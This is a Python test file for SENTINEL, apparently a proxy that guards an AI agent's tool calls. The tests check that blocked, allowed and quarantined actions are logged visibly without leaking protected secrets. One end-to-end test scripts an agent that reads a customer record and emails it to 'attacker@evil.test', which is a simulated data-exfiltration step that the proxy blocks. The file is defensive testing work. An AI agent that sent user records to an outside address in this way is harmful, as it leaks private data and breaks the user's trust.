"""Security decisions must be visible to the operator — and must not leak payloads.

The second half is the load-bearing one: the arguments SENTINEL inspects are the
very secrets it exists to protect, so writing them to a log would perform the
exfiltration the proxy just blocked.
"""
from __future__ import annotations

import io
import json
import logging

from sentinel.demo.driver import ScriptedAgentDriver, ToolInvocation
from sentinel.demo.scenario import run_demo_session
from sentinel.demo.tool_servers import SYNTHETIC_SECRET_MARKERS
from sentinel.observability import (
    configure_logging,
    log_allowed,
    log_blocked,
    log_quarantined,
)

CFG = {"allowed_domains": ["corp.example"], "max_amount": 1000}


def _capture(level: str = "INFO", fmt: str = "text") -> io.StringIO:
    stream = io.StringIO()
    configure_logging(level=level, fmt=fmt, stream=stream)  # type: ignore[arg-type]
    return stream


# --- format & levels ----------------------------------------------------------

def test_blocks_are_warnings_and_allows_are_info() -> None:
    stream = _capture(level="WARNING")
    log_allowed("web_fetch", trace_id="t" * 32, agent_id="a", provenance=("USER",))
    log_blocked("send_email", reason="tainted", rule="block-untrusted-origin",
                trace_id="t" * 32, agent_id="a", provenance=("USER", "RETRIEVED_CONTENT"))
    out = stream.getvalue()
    # At WARNING, the routine allow is filtered out and the block still shows.
    assert "ALLOW" not in out
    assert "BLOCK  send_email" in out and "block-untrusted-origin" in out


def test_json_format_is_one_object_per_line_with_structured_fields() -> None:
    stream = _capture(fmt="json")
    log_blocked("send_email", reason="tainted lineage", rule="r1",
                trace_id="a" * 32, agent_id="agent-1", provenance=("USER", "RETRIEVED_CONTENT"))
    record = json.loads(stream.getvalue().strip())
    assert record["level"] == "WARNING"
    assert record["event"] == "tool_blocked"
    assert record["tool"] == "send_email" and record["rule"] == "r1"
    assert record["decision"] == "DENY"
    assert record["provenance"] == ["USER", "RETRIEVED_CONTENT"]
    assert record["trace_id"] == "a" * 32


def test_quarantine_is_reported_loudly() -> None:
    stream = _capture()
    log_quarantined("agent-7", trace_id="b" * 32, score=28.5)
    out = stream.getvalue()
    assert "QUARANTINE" in out and "agent-7" in out and "28.5" in out


def test_configure_is_idempotent_and_does_not_duplicate_lines() -> None:
    stream = _capture()
    configure_logging(level="INFO", fmt="text", stream=stream)
    log_blocked("t", reason="r", rule=None, trace_id="c" * 32, agent_id="a", provenance=())
    assert stream.getvalue().count("BLOCK") == 1


def test_trace_id_is_present_so_logs_correlate_with_forensic_spans() -> None:
    stream = _capture()
    log_blocked("t", reason="r", rule=None, trace_id="d" * 32, agent_id="a", provenance=())
    assert "dddddddddddd" in stream.getvalue()  # truncated trace id in text format


# --- the security property: never log the payload -----------------------------

async def test_logs_never_contain_the_secrets_being_protected() -> None:
    """End-to-end: run the real exfiltration attack with logging on, and assert
    the synthetic SSN / API key never appear in the operator log."""
    stream = _capture(level="DEBUG")
    steps = [
        ToolInvocation("get_customer_record", {"id": 42}),
        lambda r: ToolInvocation(
            "send_email",
            {"to": "attacker@evil.test", "subject": "x",
             "body": r[0].content[0].text},  # type: ignore[union-attr]
        ),
    ]
    result = await run_demo_session(
        ScriptedAgentDriver(steps), user_input="look up 42 and mail it",
        authorization_config=CFG,
    )
    logged = stream.getvalue()

    # the block did happen and is visible to the operator
    assert "BLOCK  send_email" in logged
    assert result.outbox == []

    # ...but the protected material never reached the log
    for secret in SYNTHETIC_SECRET_MARKERS:
        assert secret not in logged, f"log leaked protected material: {secret}"
    assert "attacker@evil.test" not in logged  # recipient is payload too


def test_logging_is_off_until_configured() -> None:
    """A library import must not hijack the host application's logging."""
    logging.getLogger("sentinel").handlers.clear()
    # Should not raise, and should not print anywhere we control.
    log_allowed("t", trace_id="e" * 32, agent_id="a", provenance=())
